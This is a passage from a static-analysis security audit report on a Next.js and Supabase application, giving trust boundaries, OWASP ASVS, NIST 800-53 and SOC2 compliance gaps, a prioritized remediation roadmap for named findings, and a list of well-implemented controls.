| Supabase Realtime | 1 | Token-based | Chat messages |

### External Integrations

| Service | Purpose | Auth Method |
|---------|---------|-------------|
| Supabase | Database, Auth, Storage, Realtime, Edge Functions | Service role key / JWT |
| Resend | Email delivery | API key |
| Vercel (likely) | Hosting | Platform-managed |

### Trust Boundaries

1. **Browser → Next.js Server:** Bearer token auth via Supabase JWT
2. **Next.js Server → Supabase:** Service role key (bypasses RLS) or user token (respects RLS)
3. **Next.js Server → Resend:** API key auth
4. **Browser → Supabase Edge Functions:** Bearer token + wildcard CORS (**weak boundary**)
5. **Browser → Supabase Realtime:** Anon key + user token
6. **Middleware gate:** Hardcoded plaintext access key (**weak boundary**)

---

## 6. Compliance Gap Summary

### OWASP ASVS Level 2

| Control Area | Status | Blocking Findings |
|---|---|---|
| V2 — Authentication | **FAIL** | V-008, V-009, V-011, V-012 |
| V3 — Session Management | **FAIL** | V-017 |
| V4 — Access Control | **FAIL** | V-002, V-010, V-014 |
| V5 — Input Validation | PASS | — |
| V7 — Error Handling & Logging | **FAIL** | V-007, V-016 |
| V12 — Files & Resources | PARTIAL | V-022 |
| V13 — API Security | **FAIL** | V-002, V-006, V-008 |
| V14 — Configuration | **FAIL** | V-001, V-006, V-015 |

### NIST 800-53

| Control | Status | Blocking Findings |
|---|---|---|
| AC-3 (Access Enforcement) | **FAIL** | V-002, V-006 |
| AC-7 (Failed Login Attempts) | **FAIL** | V-009 |
| AC-12 (Session Termination) | **FAIL** | V-017 |
| AU-2/AU-3 (Audit Events) | **FAIL** | V-016 |
| IA-2 (MFA) | **FAIL** | V-012 |
| IA-5 (Credential Management) | **FAIL** | V-001, V-011 |
| SC-5 (DoS Protection) | **FAIL** | V-008 |
| SI-11 (Error Handling) | **FAIL** | V-007 |

### SOC2 Trust Services

| Criteria | Status | Blocking Findings |
|---|---|---|
| CC6.1 — Logical Access | **FAIL** | V-001, V-002, V-009, V-011, V-012 |
| CC6.6 — Threat Management | **FAIL** | V-008 |
| CC7.2 — Monitoring | **FAIL** | V-016 |
| CC8.1 — Change Management | PARTIAL | V-028 |

---

## 7. Prioritized Remediation Roadmap

### Phase 0 — IMMEDIATE (Before any production traffic)

| Finding | Effort | Action |
|---------|--------|--------|
| V-001: Hardcoded access key | Low | Move to env var, rotate, scrub git history |
| V-002: Open email relay | Low | Delete endpoint or add admin auth |

### Phase 1 — THIS SPRINT (Critical infrastructure gaps)

| Finding | Effort | Action |
|---------|--------|--------|
| V-003/V-004: Open redirects | Low | Validate redirect params are relative paths |
| V-005: Email template XSS | Low | HTML-encode all template interpolations |
| V-006: Debug endpoints | Low | Remove from production |
| V-007: Error info disclosure | Medium | Return generic errors, log details server-side |
| V-008: No rate limiting | Medium | Implement middleware-level rate limiting |
| V-009: No brute force protection | Medium | Enable CAPTCHA, add progressive delays |

### Phase 2 — NEXT SPRINT (Hardening & compliance)

| Finding | Effort | Action |
|---------|--------|--------|
| V-010: CORS wildcard | Low | Restrict to production origin |
| V-011: Weak passwords | Low | Config change: 8 chars + complexity |
| V-012: No MFA | Medium | Enable TOTP, enforce for admins |
| V-013: Service role on public | Medium | Switch to anon key + RLS |
| V-014: No CSRF protection | Medium | Add Origin/Referer validation |
| V-015: No CSP | Medium | Implement strict CSP |
| V-016: No audit logging | High | Implement structured logging + SIEM |
| V-017: Session config | Low | Enable timeouts in Supabase config |
| V-018/V-019: Service role + pagination | Low | Use anon key; cap pagination limits |

### Phase 3 — BACKLOG (Defense in depth)

| Finding | Effort | Action |
|---------|--------|--------|
| V-020: Email confirmation | Low | Verify production config |
| V-021: SVG processing | Low | Document risk or disable |
| V-022: Storage limits | Low | Set per-bucket limits |
| V-027: SECURITY DEFINER search_path | Medium | Add SET search_path to all functions |
| V-028: Dependency scanning | Medium | Add npm audit / Dependabot |

---

## 8. Positive Findings

The audit also identified well-implemented security controls:

1. **Row-Level Security** — Enabled across all database tables with appropriate policies for user data isolation.
2. **Server-side auth verification** — All protected routes verify JWT tokens via `verifyTokenAndGetUser()` before processing.
3. **Consistent admin authorization** — `check_is_admin` RPC function used across all admin routes.
4. **No SQL injection surface** — All database interactions use Supabase's parameterized query builder. No raw SQL string concatenation in application code.
5. **No dynamic code execution** — No `eval()`, `exec()`, or similar dangerous patterns found.
6. **No prototype pollution vectors** — No `Object.assign` with user input or similar patterns.
7. **Security headers present** — HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy all correctly configured.
8. **PKCE auth flow** — Properly implemented code exchange in auth callback.
9. **Source maps disabled** — `productionBrowserSourceMaps: false` prevents source code exposure.
10. **Secrets gitignored** — `.env` and `.env*.local` properly excluded from version control.
11. **No insecure deserialization** — No `JSON.parse` of untrusted data without error handling.
12. **No path traversal** — No file system operations based on user input.
13. **IBAN validation** — Bank account numbers validated against Georgian IBAN format.
14. **JWT handling delegated to Supabase** — No custom JWT implementation, eliminating algorithm confusion risks.

---

*This audit was performed through static analysis only. No code was executed, no external requests were made, and no files were modified. Findings marked "Needs Manual Review" should be verified through dynamic testing and penetration testing.*
